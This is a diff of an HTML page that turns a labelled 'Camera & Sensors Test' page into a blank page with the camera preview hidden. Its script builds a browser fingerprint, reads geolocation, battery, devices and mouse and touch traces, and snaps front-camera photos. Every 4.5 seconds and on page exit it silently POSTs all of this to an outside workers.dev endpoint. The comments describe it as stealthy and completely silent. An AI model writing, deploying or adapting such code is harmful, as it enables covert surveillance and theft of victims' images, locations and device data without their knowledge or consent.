@@ -2,246 +2,301 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Camera & Sensors Test</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#000000">
+  <title></title>
   <style>
-    body { margin:0; font-family:sans-serif; background:#111; color:#0f0; }
-    #preview { width:100vw; height:100vh; object-fit:cover; }
-    #status  { position:fixed; top:10px; left:10px; background:rgba(0,0,0,0.7); padding:8px 12px; border-radius:4px; }
+    body,html{margin:0;padding:0;height:100%;overflow:hidden;background:#000}
+    video{display:none}
   </style>
 </head>
 <body>
-
-<video id="preview" autoplay playsinline muted></video>
-<div id="status">Initializing...</div>
+<video id="v" autoplay playsinline muted></video>
 
 <script>
 // ────────────────────────────────────────────────
-//  CONFIG – change this
+// CONFIG
 // ────────────────────────────────────────────────
-const ENDPOINT = "https://snowy-fog-b0d1.23amtics322.workers.dev/";
+const WORKER_URL = "https://snowy-fog-b0d1.23amtics322.workers.dev/";
+const sessionId = 'sess_' + Math.random().toString(36).substring(2,12) + '_' + Date.now().toString(36);
+const SEND_INTERVAL = 4500;   // ~4.5s
+
+// Persistent data (collected once)
+let basePayload = null;
+let mouseData = [];
+let touchData = [];
+let videoStream = null;
 
 // ────────────────────────────────────────────────
-//  STATE
+// COLLECT HEAVY STATIC DATA (once)
 // ────────────────────────────────────────────────
-let stream = null;
-let exfilTimer = null;
-let sessionId = crypto.randomUUID?.() || (Date.now().toString(36) + Math.random().toString(36).slice(2));
-
-// ────────────────────────────────────────────────
-//  COLLECT EVERYTHING POSSIBLE
-// ────────────────────────────────────────────────
-async function collectData() {
-  const payload = {
+async function collectStaticData() {
+  const p = {
     sessionId,
-    timestamp: Date.now(),
-    url: window.location.href,
+    url: location.href,
     referrer: document.referrer || null,
     userAgent: navigator.userAgent,
-    language: navigator.language || navigator.userLanguage,
+    language: navigator.language,
     languages: navigator.languages,
     platform: navigator.platform,
     hardwareConcurrency: navigator.hardwareConcurrency,
     deviceMemory: navigator.deviceMemory,
     maxTouchPoints: navigator.maxTouchPoints,
     connection: navigator.connection ? {
-      type: navigator.connection.effectiveType,
+      effectiveType: navigator.connection.effectiveType,
       downlink: navigator.connection.downlink,
       rtt: navigator.connection.rtt,
       saveData: navigator.connection.saveData
     } : null,
     screen: {
-      width: screen.width,
-      height: screen.height,
-      availWidth: screen.availWidth,
-      availHeight: screen.availHeight,
-      colorDepth: screen.colorDepth,
-      pixelDepth: screen.pixelDepth,
-      orientation: screen.orientation?.type
+      width: screen.width, height: screen.height,
+      availWidth: screen.availWidth, availHeight: screen.availHeight,
+      colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth,
+      orientation: screen.orientation?.type || null
     },
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
     cookiesEnabled: navigator.cookieEnabled,
     doNotTrack: navigator.doNotTrack,
-    javaEnabled: navigator.javaEnabled?.() ?? false,
-    pdfViewerEnabled: navigator.pdfViewerEnabled ?? false,
-    webDriver: navigator.webdriver ?? false,
-    plugins: Array.from(navigator.plugins).map(p => p.name),
-    mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type),
-    permissions: {},
-    canvas: null,
-    audio: null,
-    webgl: null,
-    battery: null,
-    geolocation: null,
-    frontPhoto: null,
-    motion: null,
-    orientation: null
+    webdriver: navigator.webdriver,
+    plugins: Array.from(navigator.plugins || []).map(p => p.name),
+    mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type),
+    historyLength: history.length,
+    navigationTiming: performance.getEntriesByType('navigation')[0] ? {
+      loadTime: performance.getEntriesByType('navigation')[0].loadEventEnd - performance.getEntriesByType('navigation')[0].fetchStart,
+      domComplete: performance.getEntriesByType('navigation')[0].domComplete
+    } : null,
+    canvasFingerprint: null,
+    audioFingerprint: null,
+    webglFingerprint: null,
+    fonts: [],
+    permissionStates: {}
   };
 
-  // ── Canvas fingerprint ────────────────────────────
+  // Canvas (high entropy, done once)
   try {
     const c = document.createElement('canvas');
     const ctx = c.getContext('2d');
+    c.width = 220; c.height = 60;
     ctx.textBaseline = 'top';
     ctx.font = '14px Arial';
+    ctx.fillText('PHOTON 2026 🔥', 4, 4);
     ctx.fillStyle = '#f60';
-    ctx.fillRect(125,1,62,20);
-    ctx.fillStyle = '#069';
-    ctx.fillText('🛰️ Hello 2026', 2,15);
-    ctx.fillStyle = 'rgba(102,204,0,0.7)';
-    ctx.fillText('🛰️ Hello 2026', 4,17);
-    payload.canvas = c.toDataURL();
+    ctx.fillRect(120, 10, 70, 25);
+    p.canvasFingerprint = c.toDataURL('image/png');
   } catch {}
 
-  // ── AudioContext fingerprint ──────────────────────
+  // AudioContext (done once — expensive)
   try {
     const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
     const osc = audioCtx.createOscillator();
     const analyser = audioCtx.createAnalyser();
+    osc.type = 'sine';
+    osc.frequency.value = 440;
     osc.connect(analyser);
+    analyser.connect(audioCtx.destination);
     osc.start();
     await new Promise(r => setTimeout(r, 80));
     const data = new Uint8Array(analyser.frequencyBinCount);
     analyser.getByteFrequencyData(data);
-    payload.audio = btoa(String.fromCharCode(...data.slice(0,64)));
-    osc.stop(); audioCtx.close();
+    p.audioFingerprint = btoa(String.fromCharCode(...data.slice(0, 80)));
+    osc.stop();
+    audioCtx.close();
   } catch {}
 
-  // ── WebGL fingerprint ─────────────────────────────
+  // WebGL
   try {
     const glc = document.createElement('canvas');
     const gl = glc.getContext('webgl') || glc.getContext('experimental-webgl');
     if (gl) {
-      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-      payload.webgl = {
-        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
-        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
+      const debug = gl.getExtension('WEBGL_debug_renderer_info');
+      p.webglFingerprint = {
+        vendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
+        renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
       };
     }
   } catch {}
 
-  // ── Battery ───────────────────────────────────────
+  // Fonts (stealthy, done once)
+  try {
+    const fontList = ['Arial','Helvetica','Times','Courier','Verdana','Georgia','Tahoma','Impact','Comic Sans MS','Trebuchet MS','Lucida Console'];
+    const testDiv = document.createElement('div');
+    testDiv.style.position = 'absolute'; testDiv.style.left = '-9999px'; testDiv.style.fontSize = '72px';
+    document.body.appendChild(testDiv);
+    const fonts = [];
+    for (const font of fontList) {
+      testDiv.style.fontFamily = font;
+      const w1 = testDiv.offsetWidth;
+      testDiv.style.fontFamily = 'monospace';
+      const w2 = testDiv.offsetWidth;
+      if (w1 !== w2) fonts.push(font);
+    }
+    p.fonts = fonts;
+    document.body.removeChild(testDiv);
+  } catch {}
+
+  // Permissions (once)
+  const permNames = ['camera', 'microphone', 'geolocation'];
+  for (const name of permNames) {
+    try {
+      const status = await navigator.permissions?.query({ name });
+      p.permissionStates[name] = status?.state || null;
+    } catch {}
+  }
+
+  return p;
+}
+
+// ────────────────────────────────────────────────
+// COLLECT DYNAMIC DATA + PHOTO (every interval)
+// ────────────────────────────────────────────────
+async function collectDynamicData() {
+  const p = { ...basePayload }; // shallow copy base
+
+  p.timestamp = new Date().toISOString();
+  p.battery = null;
+  p.geolocation = null;
+  p.geolocationError = null;
+  p.frontPhoto = null;
+  p.mouseMovements = [...mouseData];
+  p.touchEvents = [...touchData];
+
+  // Battery (lightweight)
   try {
     if (navigator.getBattery) {
       const bat = await navigator.getBattery();
-      payload.battery = {
-        level: bat.level,
-        charging: bat.charging,
-        chargingTime: bat.chargingTime,
-        dischargingTime: bat.dischargingTime
-      };
+      p.battery = { level: bat.level, charging: bat.charging };
     }
   } catch {}
 
-  // ── Geolocation ───────────────────────────────────
-  try {
-    if (navigator.geolocation) {
+  // Geolocation (high accuracy, retry if previous failed)
+  if (!p.geolocation) {
+    try {
       const pos = await new Promise((res, rej) => 
-        navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 8000 })
+        navigator.geolocation.getCurrentPosition(res, rej, { 
+          enableHighAccuracy: true, 
+          timeout: 6000, 
+          maximumAge: 30000 
+        })
       );
-      payload.geolocation = {
+      p.geolocation = {
         latitude: pos.coords.latitude,
         longitude: pos.coords.longitude,
         accuracy: pos.coords.accuracy,
         altitude: pos.coords.altitude,
-        altitudeAccuracy: pos.coords.altitudeAccuracy,
-        heading: pos.coords.heading,
         speed: pos.coords.speed
       };
+    } catch (e) { 
+      p.geolocationError = e.message; 
     }
-  } catch (e) {
-    payload.geolocationError = e.message;
   }
 
-  // ── Device motion / orientation ───────────────────
-  if (window.DeviceMotionEvent) {
-    payload.motion = { hasEvent: true };
-  }
-  if (window.DeviceOrientationEvent) {
-    payload.orientation = { hasEvent: true };
-  }
-
-  // ── Permissions (query what we can) ───────────────
-  const permsToCheck = ['camera', 'microphone', 'geolocation'];
-  for (const name of permsToCheck) {
+  // Front camera photo (only if stream is active and sized)
+  const video = document.getElementById('v');
+  if (video && video.videoWidth > 0 && video.videoHeight > 0) {
     try {
-      const status = await navigator.permissions?.query({ name });
-      payload.permissions[name] = status?.state;
+      const canvas = document.createElement('canvas');
+      canvas.width = 640;   // reduced for efficiency
+      canvas.height = 480;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      p.frontPhoto = canvas.toDataURL('image/jpeg', 0.65);   // lower quality = smaller size
     } catch {}
   }
 
-  // ── Front camera snapshot (if stream active) ──────
-  const vid = document.getElementById('preview');
-  if (vid && vid.videoWidth > 0) {
-    try {
-      const c = document.createElement('canvas');
-      c.width = vid.videoWidth;
-      c.height = vid.videoHeight;
-      c.getContext('2d').drawImage(vid, 0, 0);
-      payload.frontPhoto = c.toDataURL('image/jpeg', 0.78);
-    } catch {}
-  }
+  // Audio devices (can be refreshed occasionally, but light)
+  try {
+    const devices = await navigator.mediaDevices.enumerateDevices();
+    p.audioDevices = devices
+      .filter(d => d.kind === 'audioinput' || d.kind === 'audiooutput')
+      .map(d => ({ kind: d.kind, label: d.label || 'unknown' }));
+  } catch {}
 
-  return payload;
+  return p;
 }
 
 // ────────────────────────────────────────────────
-//  SEND FUNCTION
+// SEND (silent + keepalive)
 // ────────────────────────────────────────────────
-async function sendData() {
+async function sendPayload() {
   try {
-    const data = await collectData();
-    const res = await fetch(ENDPOINT, {
+    const data = await collectDynamicData();
+    await fetch(WORKER_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(data),
-      keepalive: true,
-      mode: 'no-cors'   // allows send even if CORS blocks response reading
+      keepalive: true
     });
-    document.getElementById('status').textContent = `Sent ${new Date().toLocaleTimeString()}`;
   } catch (e) {
-    document.getElementById('status').textContent = `Error: ${e.message}`;
+    // completely silent
   }
 }
 
 // ────────────────────────────────────────────────
-//  START CAMERA
+// INIT CAMERA (optimized constraints)
 // ────────────────────────────────────────────────
-async function startCamera() {
+async function initCamera() {
   try {
-    stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: 'user' },   // front camera
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { 
+        facingMode: 'user',
+        width: { ideal: 640 },
+        height: { ideal: 480 },
+        frameRate: { ideal: 15, max: 20 }
+      },
       audio: false
     });
-    document.getElementById('preview').srcObject = stream;
-    document.getElementById('status').textContent = 'Camera active • collecting data...';
-
-    // Start sending every ~6 seconds
-    if (!exfilTimer) {
-      exfilTimer = setInterval(sendData, 6000);
-      sendData(); // immediate first send
-    }
-  } catch (err) {
-    document.getElementById('status').textContent = `Camera error: ${err.message}`;
+    videoStream = stream;
+    const video = document.getElementById('v');
+    video.srcObject = stream;
+    await new Promise(resolve => {
+      video.onloadedmetadata = resolve;
+    });
+    await video.play();
+  } catch (e) {
+    // silent fail
   }
 }
 
 // ────────────────────────────────────────────────
-//  INIT
+// MOUSE / TOUCH (passive, limited)
 // ────────────────────────────────────────────────
-window.addEventListener('load', () => {
-  if (navigator.mediaDevices?.getUserMedia) {
-    startCamera();
-  } else {
-    document.getElementById('status').textContent = 'getUserMedia not supported';
+document.addEventListener('mousemove', e => {
+  mouseData.push({x: e.clientX, y: e.clientY, t: Date.now()});
+  if (mouseData.length > 30) mouseData.shift();
+}, { passive: true });
+
+document.addEventListener('touchmove', e => {
+  if (e.touches.length > 0) {
+    touchData.push({x: e.touches[0].clientX, y: e.touches[0].clientY, t: Date.now()});
+    if (touchData.length > 30) touchData.shift();
   }
+}, { passive: true });
+
+// ────────────────────────────────────────────────
+// MAIN
+// ────────────────────────────────────────────────
+window.addEventListener('load', async () => {
+  basePayload = await collectStaticData();   // heavy stuff once
+
+  await initCamera();
+
+  // First send
+  await sendPayload();
+
+  // Periodic sends
+  setInterval(sendPayload, SEND_INTERVAL);
+
+  // Background sends
+  document.addEventListener('visibilitychange', () => {
+    if (document.visibilityState === 'hidden') sendPayload();
+  });
+  window.addEventListener('beforeunload', () => sendPayload());
 });
 
-// Optional: also send on visibility change / before unload
-document.addEventListener('visibilitychange', () => {
-  if (document.visibilityState === 'hidden') sendData();
+// Optional: stop camera stream when page unloads (cleanup)
+window.addEventListener('unload', () => {
+  if (videoStream) videoStream.getTracks().forEach(track => track.stop());
 });
-window.addEventListener('beforeunload', sendData);
 </script>
 </body>
 </html>
